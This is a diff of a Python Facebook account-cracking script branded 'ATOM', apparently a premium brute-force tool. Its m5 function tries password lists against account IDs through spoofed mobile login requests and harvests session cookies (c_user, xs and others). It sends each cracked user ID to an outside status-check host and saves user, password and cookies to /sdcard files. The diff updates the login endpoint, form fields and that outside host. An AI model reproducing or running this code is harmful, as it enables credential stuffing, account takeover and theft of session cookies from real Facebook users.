@@ -353,7 +353,7 @@ def banner():
    ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \x1b[38;1;97m ᴾᴿᴼ"""); print("""\033[38;5;196m────────────────────────────────────────────
 \033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m CEO & OWNER    \033[38;5;196m : \x1b[38;5;196m SUMON ROY
 \033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m  ABOUTS  \033[38;5;196m  :\x1b[38;5;196m DESTROYED
-\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m VERSION \033[38;5;196m  :\x1b[38;1;97m 109.0.5.0.3
+\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m VERSION \033[38;5;196m  :\x1b[38;1;97m 109.0.5.0.4
 \033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m STATUS \033[38;5;196m   :\x1b[38;5;196m PREMIUM 
 \033[38;5;196m────────────────────────────────────────────""")
 ip = requests.get("https://api.ipify.org").text
@@ -1243,55 +1243,62 @@ def m5(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get(f'https://m.prod.facebook.com').text
-   log_data = {'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-    'email': idf, 
-    'next': 'https://x.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified', 
-    'flow': 'login_no_pin', 
-    'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), ps),
-    'login': 'Masuk'}  
-   header_freefb ={
-    'Host': 'm.prod.facebook.com',
-    'cache-control': 'max-age=0',
-    'upgrade-insecure-requests': '1',
-    'origin': 'https://m.prod.facebook.com',
-    'content-type': 'application/x-www-form-urlencoded',
-    'x-requested-with': 'XMLHttpRequest',
-    'user-agent': 'viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .17; WOW64)PQ1A)Applewebkit/537.36 (KHTML, like Gecko) Chrome/92.0.4934.52 Safari/537.36 Vivaldi/6.0.2979.18',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-user': '?1',
-    'sec-fetch-dest': 'document',
-    'dpr': '4',
-    'viewport-width': '647',
-    'sec-ch-ua': '"Not)A;Brand";v="12", "Chromium";v="100"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"9.0.0"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="17.0.0.0", "Chromium";v="106.0.5759.45"',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
-    'accept-encoding': 'gzip, deflate, br',
-    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}  #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
+   free_fb = session.get(f'https://m.facebook.com').text
+   log_data = {
+    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+    "try_number": 0,
+    "unrecognized_tries": 0,
+    "email": idf,
+    "prefill_contact_point": ids,
+    "prefill_source": "browser_dropdown",
+    "prefill_type": "contact_point",
+    "first_prefill_source": "browser_dropdown",
+    "first_prefill_type": "contact_point",
+    "had_cp_prefilled": True,
+    "had_password_prefilled": False,
+    "is_smart_lock": False,
+    "bi_xrwh": 0,
+    "encpass": "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),ps),
+    "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+    "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
+   header_freefb ={'Host': 'mbasic.facebook.com',
+    'Content-Length': '1730',
+    'Sec-CH-UA': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
+    'Sec-CH-UA-Mobile': '?1',
+    'User-Agent': "Mozilla/5.0 (X11; Linux x86_64 11;  TL-tl; SM-T531) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4445.57 Safari/537.36",
+    'X-Response-Format': 'JSONStream',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'X-FB-LSD': 'AVo_Z7twFKE',
+    'Viewport-Width': '360',
+    'Sec-CH-UA-Platform-Version': '""',
+    'X-Requested-With': 'XMLHttpRequest',
+    'X-ASBD-ID': '129477',
+    'DPR': '2',
+    'Sec-CH-UA-Full-Version-List': '',
+    'Sec-CH-UA-Model': '""',
+    'Sec-CH-Prefers-Color-Scheme': 'light',
+    'Sec-CH-UA-Platform': '"Android"',
+    'Accept': '*/*',
+    'Origin': 'https://mbasic.facebook.com',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Dest': 'empty',
+    'Referer': 'https://mbasic.facebook.com/',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Language': 'en-IE,en-US;q=0.9,en;q=0.8'}#'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
+   lo = session.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki= "; ".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+    url = f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={user}"
     reqx = requests.get(url).text
-    if 'live' in reqx:
+    if 'LIVE' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
-            ok+=1 
-            break
-    if 'lock' in reqx:
-            print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
-            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-M6-DEATH-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            open('/sdcard/ATOM-COOKIESs-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
    elif 'checkpoint' in log_cookies:
